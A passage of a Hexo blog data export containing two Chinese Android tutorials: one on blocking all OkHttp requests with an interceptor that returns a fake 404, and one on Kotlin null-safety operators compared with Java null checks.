Android\n---\n\n我们在创建OkHttp客户端时，可以添加各种拦截器，这是我见过最有可玩性的库之一：\n\n```java\nOkHttpClient okHttpClient = new OkHttpClient.Builder()\n        .connectTimeout(10, TimeUnit.SECONDS)\n        .addInterceptor(new XXXInterceptor())\n        .addInterceptor(new YYYInterceptor())\n        ....\n        .build();\n```\n\n设想这么一个场景，用户有一个开关，可以允许或禁止应用内的一切网络请求，如何用拦截器来实现？\n为了不让大家觉得我又在水贴，直入主题。\n我们可以通过构造一个404的response来拦截请求：\n\n```java\nprivate static class NetworkInterceptor implements Interceptor {\n    @Override\n    public okhttp3.Response intercept(Chain chain) throws IOException {\n        if (/*你妈妈不准你上网*/) {\n            return new okhttp3.Response.Builder()\n                    .code(404) // 其实code可以随便给\n                    .protocol(Protocol.HTTP_2)\n                    .message(\"Network is closed by mom\")\n                    .body(ResponseBody.create(MediaType.get(\"text/html; charset=utf-8\"), \"\")) // 返回空页面\n                    .request(chain.request())\n                    .build();            \n        } else {\n            return chain.proceed(chain.request());                    \n        }\n    }\n}\n```\n\n一定要记住哦，code，protocol，message，body缺一不可。\n","slug":"OkHttp拦截器实现禁止一切网络请求","published":1,"updated":"2024-03-25T07:31:25.855Z","comments":1,"photos":[],"link":"","_id":"cluaufh0m0011the6hrul8b03","content":"<p>我们在创建OkHttp客户端时，可以添加各种拦截器，这是我见过最有可玩性的库之一：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">OkHttpClient</span> <span class=\"variable\">okHttpClient</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">OkHttpClient</span>.Builder()</span><br><span class=\"line\">        .connectTimeout(<span class=\"number\">10</span>, TimeUnit.SECONDS)</span><br><span class=\"line\">        .addInterceptor(<span class=\"keyword\">new</span> <span class=\"title class_\">XXXInterceptor</span>())</span><br><span class=\"line\">        .addInterceptor(<span class=\"keyword\">new</span> <span class=\"title class_\">YYYInterceptor</span>())</span><br><span class=\"line\">        ....</span><br><span class=\"line\">        .build();</span><br></pre></td></tr></table></figure>\n\n<p>设想这么一个场景，用户有一个开关，可以允许或禁止应用内的一切网络请求，如何用拦截器来实现？<br>为了不让大家觉得我又在水贴，直入主题。<br>我们可以通过构造一个404的response来拦截请求：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">NetworkInterceptor</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Interceptor</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> okhttp3.Response <span class=\"title function_\">intercept</span><span class=\"params\">(Chain chain)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"comment\">/*你妈妈不准你上网*/</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">okhttp3</span>.Response.Builder()</span><br><span class=\"line\">                    .code(<span class=\"number\">404</span>) <span class=\"comment\">// 其实code可以随便给</span></span><br><span class=\"line\">                    .protocol(Protocol.HTTP_2)</span><br><span class=\"line\">                    .message(<span class=\"string\">&quot;Network is closed by mom&quot;</span>)</span><br><span class=\"line\">                    .body(ResponseBody.create(MediaType.get(<span class=\"string\">&quot;text/html; charset=utf-8&quot;</span>), <span class=\"string\">&quot;&quot;</span>)) <span class=\"comment\">// 返回空页面</span></span><br><span class=\"line\">                    .request(chain.request())</span><br><span class=\"line\">                    .build();            </span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> chain.proceed(chain.request());                    </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>一定要记住哦，code，protocol，message，body缺一不可。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p>我们在创建OkHttp客户端时，可以添加各种拦截器，这是我见过最有可玩性的库之一：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">OkHttpClient</span> <span class=\"variable\">okHttpClient</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">OkHttpClient</span>.Builder()</span><br><span class=\"line\">        .connectTimeout(<span class=\"number\">10</span>, TimeUnit.SECONDS)</span><br><span class=\"line\">        .addInterceptor(<span class=\"keyword\">new</span> <span class=\"title class_\">XXXInterceptor</span>())</span><br><span class=\"line\">        .addInterceptor(<span class=\"keyword\">new</span> <span class=\"title class_\">YYYInterceptor</span>())</span><br><span class=\"line\">        ....</span><br><span class=\"line\">        .build();</span><br></pre></td></tr></table></figure>\n\n<p>设想这么一个场景，用户有一个开关，可以允许或禁止应用内的一切网络请求，如何用拦截器来实现？<br>为了不让大家觉得我又在水贴，直入主题。<br>我们可以通过构造一个404的response来拦截请求：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">NetworkInterceptor</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Interceptor</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> okhttp3.Response <span class=\"title function_\">intercept</span><span class=\"params\">(Chain chain)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"comment\">/*你妈妈不准你上网*/</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">okhttp3</span>.Response.Builder()</span><br><span class=\"line\">                    .code(<span class=\"number\">404</span>) <span class=\"comment\">// 其实code可以随便给</span></span><br><span class=\"line\">                    .protocol(Protocol.HTTP_2)</span><br><span class=\"line\">                    .message(<span class=\"string\">&quot;Network is closed by mom&quot;</span>)</span><br><span class=\"line\">                    .body(ResponseBody.create(MediaType.get(<span class=\"string\">&quot;text/html; charset=utf-8&quot;</span>), <span class=\"string\">&quot;&quot;</span>)) <span class=\"comment\">// 返回空页面</span></span><br><span class=\"line\">                    .request(chain.request())</span><br><span class=\"line\">                    .build();            </span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> chain.proceed(chain.request());                    </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>一定要记住哦，code，protocol，message，body缺一不可。</p>\n"},{"layout":"post","title":"Kotlin操作符快速获取爸爸的儿子的狗的名字","subtitle":"学以致用。","date":"2019-07-31T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n> NPE（NullPointerException）是最低级且也最容易犯的错，~~也是最喜欢遇到的Bug因为好解~~。\n>本文适合Kotlin入门萌新食用，大佬轻喷哈哈哈！\n\n### 问号N连帮你空处理（?）\n假如服务端返回一个json嵌套了各种数据，映射成POJO大概是这样：\n\n```java\n// 此处为简洁省去getter和setter\npublic class TestParent {\n    private TestChild child;\n\n    public class TestChild {\n        private List<TestDog> dogs;\n\n        public class TestDog {\n            private String name;\n        }\n    }\n}\n```\n然后，你为了知道他爸的儿子的第一条狗叫啥名，你需要这样：\n\n```java\nif (parent != null) { // 有爹\n    TestParent.TestChild child = parent.getChild();\n    if (child != null) { // 有儿子\n        List<TestParent.TestChild.TestDog> dogs = child.getDogs();\n        if (dogs != null && !dogs.isEmpty()) {\n            TestParent.TestChild.TestDog dog0 = dogs.get(0);\n            if (dog0 != null) { // 有狗\n                System.out.println(\"name:\" + dog0.getName());\n            }\n        }\n    }\n}\n```\n初学者大部分都会这样写，我的天，这太臃肿了，丑代码，凑行数，于是我决定优化一下（这里不考虑Java 8的API），尽可能减少if嵌套：\n\n```java\nTestParent.TestChild child = parent != null ? parent.getChild() : null;\nList<TestParent.TestChild.TestDog> dogs = child != null ? child.getDogs() : null;\nTestParent.TestChild.TestDog dog0 = (dogs != null && !dogs.isEmpty()) ? dogs.get(0) : null;\nif (dog0 != null) System.out.println(\"name:\" + dog0.getName());\n```\n这种拆分，虽然简洁，但损失了可读性，反应慢的同学一时半会儿还搞不清楚这是在干嘛。\n那么用Kotlin的“?”（空处理操作符）怎么做呢？\n\n```kotlin\nprintln(\"name:\" + parent?.child?.dogs?.firstOrNull()?.name)\n```\n窝草，直接一行就搞定了！当我第一次写出这个代码时，我就被这该死的Kotlin语法糖给甜晕了。\n**稍微解释一下：\n1、println是Kotlin的内置函数，和Java的sout一样。\n2、这里用到了Kotlin集合类中的内置函数firstOrNull，顾名思义就知道是去集合的第一个，如果取不到就返回null。\n3、? 操作符的含义就是判断左值是否为空，如果不为空就会继续后面的 .xxx 调用，这里就是链式调用，一旦链中有一个环节为空，整个表达式就返回空。\n4、结合上面的Java代码看，其实Kotlin的空处理操作符也就是简化了Java判断的三目运算符，因此我在Java当中也可以骚一行：**\n\n```java\nSystem.out.println(\"name:\" + (((parent != null ? parent.getChild() : null) != null ? parent.getChild().getDogs() : null) != null ? (!parent.getChild().getDogs().isEmpty() ? (parent.getChild().getDogs().get(0) != null ? parent.getChild().getDogs().get(0).getName() : null) : null) : null));\n// 好了，你疯了吗？我只是想告诉大家有志者事竟成，没有一行代码解决不了的事情哈哈哈哈！\n```\n### 你很确信你的对象不为空（!!）\n与空处理相反，!!操作符的含义是非空断言，我们来举个例子看看有无此操作符的区别：\n需要空检查：\n\n```kotlin\nval files = File(\"/sdcard/Android\").listFiles()\nif (files != null) {\n\tfor(f in files) {\n\t\tprintln(f.name)\n\t}\n}\n```\n不需要空检查（即人为断言files不为空）：\n```kotlin\nval files = File(\"/sdcard/Android\").listFiles()!!\nfor(f in files) {\n\tprintln(f.name)\n}\n```\n### 谁不空就用谁（?:）\n先看一个常用代码块：\n\n```java\npublic static void showSoftInput(Context context) {\n    if (context instanceof Activity) {\n        View view = ((Activity) context).getCurrentFocus();\n        if (view == null) {\n            view = new View(context);\n        }\n        InputMethodManager imm = (InputMethodManager) context\n                .getSystemService(Context.INPUT_METHOD_SERVICE);\n        if (null != imm) {\n            view.requestFocus();\n            imm.showSoftInput(view, InputMethodManager.SHOW_FORCED);\n        }\n    }\n}\n```\n这里的view先尝试通过getCurrentFocus获取，如果获取不到再new。类似这样的操作太常见了，甚至还有嵌套几层的。用Elvis操作符（?:）怎么实现呢？\n\n```kotlin\nfun showSoftInput(context: Context) {\n    if (context is Activity) {\n        val view = (context.currentFocus ?: View(context)).apply { requestFocus() }\n        (context.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager).apply {\n            showSoftInput(view, InputMethodManager.SHOW_FORCED)\n        }\n    }\n}\n```\n","source":"_posts/2019-08-01-Kotlin操作符快速获取爸爸的儿子的狗的名字.md","raw":"---\nlayout:     post\ntitle:      Kotlin操作符快速获取爸爸的儿子的狗的名字\nsubtitle:   学以致用。\ndate:       2019-08-01\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Kotlin\n    - Android\n---\n\n> NPE（NullPointerException）是最低级且也最容易犯的错，~~也是最喜欢遇到的Bug因为好解~~。\n>本文适合Kotlin入门萌新食用，大佬轻喷哈哈哈！\n\n### 问号N连帮你空处理（?）\n假如服务端返回一个json嵌套了各种数据，映射成POJO大概是这样：\n\n```java\n// 此处为简洁省去getter和setter\npublic class TestParent {\n    private TestChild child;\n\n    public class TestChild {\n        private List<TestDog> dogs;\n\n        public class TestDog {\n            private String name;\n        }\n    }\n}\n```\n然后，你为了知道他爸的儿子的第一条狗叫啥名，你需要这样：\n\n```java\nif (parent != null) { // 有爹\n    TestParent.TestChild child = parent.getChild();\n    if (child != null) { // 有儿子\n        List<TestParent.TestChild.TestDog> dogs = child.getDogs();\n        if (dogs != null && !dogs.isEmpty()) {\n            TestParent.TestChild.TestDog dog0 = dogs.get(0);\n            if (dog0 != null) { // 有狗\n                System.out.println(\"name:\" + dog0.getName());\n            }\n        }\n    }\n}\n```\n初学者大部分都会这样写，我的天，这太臃肿了，丑代码，凑行数，于是我决定优化一下（这里不考虑Java 8的API），尽可能减少if嵌套：\n\n```java\nTestParent.TestChild child = parent != null ? parent.getChild() : null;\nList<TestParent.TestChild.TestDog> dogs = child != null ? child.getDogs() : null;\nTestParent.TestChild.TestDog dog0 = (dogs != null && !dogs.isEmpty()) ? dogs.get(0) : null;\nif (dog0 != null) System.out.println(\"name:\" + dog0.getName());\n```\n这种拆分，虽然简洁，但损失了可读性，反应慢的同学一时半会儿还搞不清楚这是在干嘛。\n那么用Kotlin的“?”（空处理操作符）怎么做呢？\n\n```kotlin\nprintln(\"name:\" + parent?.child?.dogs?.firstOrNull()?.name)\n```\n窝草，直接一行就搞定了！当我第一次写出这个代码时，我就被这该死的Kotlin语法糖给甜晕了。\n**稍微解释一下：\n1、println是Kotlin的内置函数，和Java的sout一样。\n2、这里用到了Kotlin集合类中的内置函数firstOrNull，顾名思义就知道是去集合的第一个，如果取不到就返回null。\n3、? 操作符的含义就是判断左值是否为空，如果不为空就会继续后面的 .xxx 调用，这里就是链式调用，一旦链中有一个环节为空，整个表达式就返回空。\n4、结合上面的Java代码看，其实Kotlin的空处理操作符也就是简化了Java判断的三目运算符，因此我在Java当中也可以骚一行：**\n\n```java\nSystem.out.println(\"name:\" + (((parent != null ? parent.getChild() : null) != null ? parent.getChild().getDogs() : null) != null ? (!parent.getChild().getDogs().isEmpty() ? (parent.getChild().getDogs().get(0) != null ? parent.getChild().getDogs().get(0).getName() : null) : null) : null));\n// 好了，你疯了吗？我只是想告诉大家有志者事竟成，没有一行代码解决不了的事情哈哈哈哈！\n```\n### 你很确信你的对象不为空（!!）\n与空处理相反，!!操作符的含义是非空断言，我们来举个例子看看有无此操作符的区别：\n需要空检查：\n\n```kotlin\nval files = File(\"/sdcard/Android\").listFiles()\nif (files != null) {\n\tfor(f in files) {\n\t\tprintln(f.name)\n\t}\n}\n```\n不需要空检查（即人为断言files不为空）：\n```kotlin\nval files = File(\"/sdcard/Android\").listFiles()!!\nfor(f in files) {\n\tprintln(f.name)\n}\n```\n### 谁不空就用谁（?:）\n先看一个常用代码块：\n\n```java\npublic static void showSoftInput(Context context) {\n    if (context instanceof Activity) {\n        View view = ((Activity) context).getCurrentFocus();\n        if (view == null) {\n            view = new View(context);\n        }\n        InputMethodManager imm = (InputMethodManager) context\n                .getSystemService(Context.INPUT_METHOD_SERVICE);\n        if (null != imm) {\n            view.requestFocus();\n            imm.showSoftInput(view, InputMethodManager.SHOW_FORCED);\n        }\n    }\n}\n```\n这里的view先尝试通过getCurrentFocus获取，如果获取不到再new。类似这样的操作太常见了，甚至还有嵌套几层的。用Elvis操作符（?:）怎么实现呢？\n\n```kotlin\nfun showSoftInput(context: Context) {\n    if (context is Activity) {\n        val view = (context.currentFocus ?: View(context)).apply { requestFocus() }\n        (context.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager).apply {\n            showSoftInput(view, InputMethodManager.SHOW_FORCED)\n        }\n    }\n}\n```\n","slug":"Kotlin操作符快速获取爸爸的儿子的狗的名字","published":1,"updated":"2024-03-25T07:31:25.855Z","comments":1,"photos":[],"link":"","_id":"cluaufh0n0013the6fr65gafb","content":"<blockquote>\n<p>NPE（NullPointerException）是最低级且也最容易犯的错，<del>也是最喜欢遇到的Bug因为好解</del>。<br>本文适合Kotlin入门萌新食用，大佬轻喷哈哈哈！</p>\n</blockquote>\n<h3 id=\"问号N连帮你空处理（-）\"><a href=\"#问号N连帮你空处理（-）\" class=\"headerlink\" title=\"问号N连帮你空处理（?）\"></a>问号N连帮你空处理（?）</h3><p>假如服务端返回一个json嵌套了各种数据，映射成POJO大概是这样：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 此处为简洁省去getter和setter</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestParent</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> TestChild child;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestChild</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> List&lt;TestDog&gt; dogs;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestDog</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>然后，你为了知道他爸的儿子的第一条狗叫啥名，你需要这样：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (parent != <span class=\"literal\">null</span>) &#123; <span class=\"comment\">// 有爹</span></span><br><span class=\"line\">    TestParent.<span class=\"type\">TestChild</span> <span class=\"variable\">child</span> <span class=\"operator\">=</span> parent.getChild();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (child != <span class=\"literal\">null</span>) &#123; <span class=\"comment\">// 有儿子</span></span><br><span class=\"line\">        List&lt;TestParent.TestChild.TestDog&gt; dogs = child.getDogs();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (dogs != <span class=\"literal\">null</span> &amp;&amp; !dogs.isEmpty()) &#123;</span><br><span class=\"line\">            TestParent.TestChild.<span class=\"type\">TestDog</span> <span class=\"variable\">dog0</span> <span class=\"operator\">=</span> dogs.get(<span class=\"number\">0</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (dog0 != <span class=\"literal\">null</span>) &#123; <span class=\"comment\">// 有狗</span></span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;name:&quot;</span> + dog0.getName());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>初学者大部分都会这样写，我的天，这太臃肿了，丑代码，凑行数，于是我决定优化一下（这里不考虑Java 8的API），尽可能减少if嵌套：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">TestParent.<span class=\"type\">TestChild</span> <span class=\"variable\">child</span> <span class=\"operator\">=</span> parent != <span class=\"literal\">null</span> ? parent.getChild() : <span class=\"literal\">null</span>;</span><br><span class=\"line\">List&lt;TestParent.TestChild.TestDog&gt; dogs = child != <span class=\"literal\">null</span> ? child.getDogs() : <span class=\"literal\">null</span>;</span><br><span class=\"line\">TestParent.TestChild.<span class=\"type\">TestDog</span> <span class=\"variable\">dog0</span> <span class=\"operator\">=</span> (dogs != <span class=\"literal\">null</span> &amp;&amp; !dogs.isEmpty()) ? dogs.get(<span class=\"number\">0</span>) : <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (dog0 != <span class=\"literal\">null</span>) System.out.println(<span class=\"string\">&quot;name:&quot;</span> + dog0.getName());</span><br></pre></td></tr></table></figure>\n<p>这种拆分，虽然简洁，但损失了可读性，反应慢的同学一时半会儿还搞不清楚这是在干嘛。<br>那么用Kotlin的“?”（空处理操作符）怎么做呢？</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">println(<span class=\"string\">&quot;name:&quot;</span> + parent?.child?.dogs?.firstOrNull()?.name)</span><br></pre></td></tr></table></figure>\n<p>窝草，直接一行就搞定了！当我第一次写出这个代码时，我就被这该死的Kotlin语法糖给甜晕了。<br><strong>稍微解释一下：<br>1、println是Kotlin的内置函数，和Java的sout一样。<br>2、这里用到了Kotlin集合类中的内置函数firstOrNull，顾名思义就知道是去集合的第一个，如果取不到就返回null。<br>3、? 操作符的含义就是判断左值是否为空，如果不为空就会继续后面的 .xxx 调用，这里就是链式调用，一旦链中有一个环节为空，整个表达式就返回空。<br>4、结合上面的Java代码看，其实Kotlin的空处理操作符也就是简化了Java判断的三目运算符，因此我在Java当中也可以骚一行：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">System.out.println(<span class=\"string\">&quot;name:&quot;</span> + (((parent != <span class=\"literal\">null</span> ? parent.getChild() : <span class=\"literal\">null</span>) != <span class=\"literal\">null</span> ? parent.getChild().getDogs() : <span class=\"literal\">null</span>) != <span class=\"literal\">null</span> ? (!parent.getChild().getDogs().isEmpty() ? (parent.getChild().getDogs().get(<span class=\"number\">0</span>) != <span class=\"literal\">null</span> ? parent.getChild().getDogs().get(<span class=\"number\">0</span>).getName() : <span class=\"literal\">null</span>) : <span class=\"literal\">null</span>) : <span class=\"literal\">null</span>));</span><br><span class=\"line\"><span class=\"comment\">// 好了，你疯了吗？我只是想告诉大家有志者事竟成，没有一行代码解决不了的事情哈哈哈哈！</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"你很确信你的对象不为空（-）\"><a href=\"#你很确信你的对象不为空（-）\" class=\"headerlink\" title=\"你很确信你的对象不为空（!!）\"></a>你很确信你的对象不为空（!!）</h3><p>与空处理相反，!!操作符的含义是非空断言，我们来举个例子看看有无此操作符的区别：<br>需要空检查：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">val</span> files = File(<span class=\"string\">&quot;/sdcard/Android&quot;</span>).listFiles()</span><br><span class=\"line\"><span class=\"keyword\">if</span> (files != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(f <span class=\"keyword\">in</span> files) &#123;</span><br><span class=\"line\">\t\tprintln(f.name)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>不需要空检查（即人为断言files不为空）：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">val</span> files = File(<span class=\"string\">&quot;/sdcard/Android&quot;</span>).listFiles()!!</span><br><span class=\"line\"><span class=\"keyword\">for</span>(f <span class=\"keyword\">in</span> files) &#123;</span><br><span class=\"line\">\tprintln(f.name)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"谁不空就用谁（-）\"><a href=\"#谁不空就用谁（-）\" class=\"headerlink\" title=\"谁不空就用谁（?:）\"></a>谁不空就用谁（?:）</h3><p>先看一个常用代码块：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">showSoftInput</span><span class=\"params\">(Context context)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (context <span class=\"keyword\">instanceof</span> Activity) &#123;</span><br><span class=\"line\">        <span class=\"type\">View</span> <span class=\"variable\">view</span> <span class=\"operator\">=</span> ((Activity) context).getCurrentFocus();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (view == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            view = <span class=\"keyword\">new</span> <span class=\"title class_\">View</span>(context);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"type\">InputMethodManager</span> <span class=\"variable\">imm</span> <span class=\"operator\">=</span> (InputMethodManager) context</span><br><span class=\"line\">                .getSystemService(Context.INPUT_METHOD_SERVICE);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"literal\">null</span> != imm) &#123;</span><br><span class=\"line\">            view.requestFocus();</span><br><span class=\"line\">            imm.showSoftInput(view, InputMethodManager.SHOW_FORCED);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里的view先尝试通过getCurrentFocus获取，如果获取不到再new。类似这样的操作太常见了，甚至还有嵌套几层的。用Elvis操作符（?:）怎么实现呢？</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">showSoftInput</span><span class=\"params\">(context: <span class=\"type\">Context</span>)</span></span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (context <span class=\"keyword\">is</span> Activity) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">val</span> view = (context.currentFocus ?: View(context)).apply &#123; requestFocus() &#125;</span><br><span class=\"line\">        (context.getSystemService(Context.INPUT_METHOD_SERVICE) <span class=\"keyword\">as</span> InputMethodManager).apply &#123;</span><br><span class=\"line\">            showSoftInput(view, InputMethodManager.SHOW_FORCED)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you 